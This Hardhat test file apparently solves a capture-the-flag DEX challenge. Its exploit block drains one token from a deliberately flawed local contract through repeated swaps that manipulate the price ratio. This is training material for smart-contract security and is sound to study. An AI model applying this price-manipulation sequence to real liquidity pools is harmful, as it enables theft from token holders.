const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.

You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.

You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.
 

Quick note
Normally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To keep with the syntax of the game, we've just added the approve method to the contract itself. So feel free to use contract.approve(contract.address, <uint amount>) instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.

  Things that might help:

- How is the price of the token calculated?
- How does the swap method work?
- How do you approve a transaction of an ERC20?

*/

describe("[Challenge] Dex", function () {
  let deployer, attacker;

  const INITIAL_TOKEN_SUPPLY = ethers.utils.parseEther("110");
  const INITIAL_TOKEN_LIQUIDITY = ethers.utils.parseEther("100");
  const INITIAL_ATTACKER_BALANCE = ethers.utils.parseEther("10");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.dex = await (
      await ethers.getContractFactory("Dex", deployer)
    ).deploy();

    this.token1 = await (
      await ethers.getContractFactory("SwappableToken", deployer)
    ).deploy(this.dex.address, "Token 1 ", "TKN1", INITIAL_TOKEN_SUPPLY);

    this.token2 = await (
      await ethers.getContractFactory("SwappableToken", deployer)
    ).deploy(this.dex.address, "Token 2 ", "TKN2", INITIAL_TOKEN_SUPPLY);

    await this.dex.setTokens(this.token1.address, this.token2.address);

    await this.dex.approve(this.dex.address, INITIAL_TOKEN_LIQUIDITY);

    await this.dex.addLiquidity(this.token1.address, INITIAL_TOKEN_LIQUIDITY);
    await this.dex.addLiquidity(this.token2.address, INITIAL_TOKEN_LIQUIDITY);

    await this.token1.transfer(attacker.address, INITIAL_ATTACKER_BALANCE);
    await this.token2.transfer(attacker.address, INITIAL_ATTACKER_BALANCE);

    const attackerBalanceToken1 = await this.token1.balanceOf(attacker.address);
    expect(attackerBalanceToken1).to.eq(INITIAL_ATTACKER_BALANCE);

    const attackerBalanceToken2 = await this.token2.balanceOf(attacker.address);
    expect(attackerBalanceToken2).to.eq(INITIAL_ATTACKER_BALANCE);

    const dexBalanceToken1 = await this.dex.balanceOf(
      this.token1.address,
      this.dex.address
    );
    expect(dexBalanceToken1).to.eq(INITIAL_TOKEN_LIQUIDITY);

    const dexBalanceToken2 = await this.dex.balanceOf(
      this.token2.address,
      this.dex.address
    );
    expect(dexBalanceToken2).to.eq(INITIAL_TOKEN_LIQUIDITY);

    // expect swap price = 1:1
    const swapPrice = (
      await this.dex.getSwapPrice(this.token1.address, this.token2.address, 1)
    ).toString();
    expect(swapPrice).to.eq("1");
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    //
    // helper function
    const printStatus = async () => {
      const attackerBalanceToken1 = ethers.utils.formatEther(
        await this.token1.balanceOf(attacker.address)
      );
      const attackerBalanceToken2 = ethers.utils.formatEther(
        await this.token2.balanceOf(attacker.address)
      );
      console.log("*** attacker token1 : token2 ***");
      console.log(attackerBalanceToken1, attackerBalanceToken2);

      const dexBalanceToken1 = ethers.utils.formatEther(
        await this.token1.balanceOf(this.dex.address)
      );
      const dexBalanceToken2 = ethers.utils.formatEther(
        await this.token2.balanceOf(this.dex.address)
      );
      console.log("*** dex token1 : token2 ***");
      console.log(dexBalanceToken1, dexBalanceToken2);
    };

    // initial pool 100:100
    // attacker bal 10:10
    await printStatus();

    // approve
    await this.dex
      .connect(attacker)
      .approve(this.dex.address, ethers.constants.MaxUint256);

    // try swap 10
    await this.dex
      .connect(attacker)
      .swap(this.token1.address, this.token2.address, INITIAL_ATTACKER_BALANCE);
    await printStatus();

    // try swap 20
    await this.dex
      .connect(attacker)
      .swap(
        this.token2.address,
        this.token1.address,
        ethers.utils.parseEther("20")
      );
    await printStatus();

    // try swap 24
    await this.dex
      .connect(attacker)
      .swap(
        this.token1.address,
        this.token2.address,
        ethers.utils.parseEther("24")
      );
    await printStatus();

    // try swap 30
    await this.dex
      .connect(attacker)
      .swap(
        this.token2.address,
        this.token1.address,
        ethers.utils.parseEther("30")
      );
    await printStatus();

    // try swap 41
    await this.dex
      .connect(attacker)
      .swap(
        this.token1.address,
        this.token2.address,
        ethers.utils.parseEther("41")
      );
    await printStatus();

    // try swap
    await this.dex
      .connect(attacker)
      .swap(
        this.token2.address,
        this.token1.address,
        ethers.utils.parseEther("43.362520469294373726")
      );
    await printStatus();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    const dexBalanceToken1 = (
      await this.token1.balanceOf(this.dex.address)
    ).toString();
    const dexBalanceToken2 = (
      await this.token2.balanceOf(this.dex.address)
    ).toString();

    const validate = dexBalanceToken1 == 0 || dexBalanceToken2 == 0;

    expect(validate).to.eq(true);
  });
});
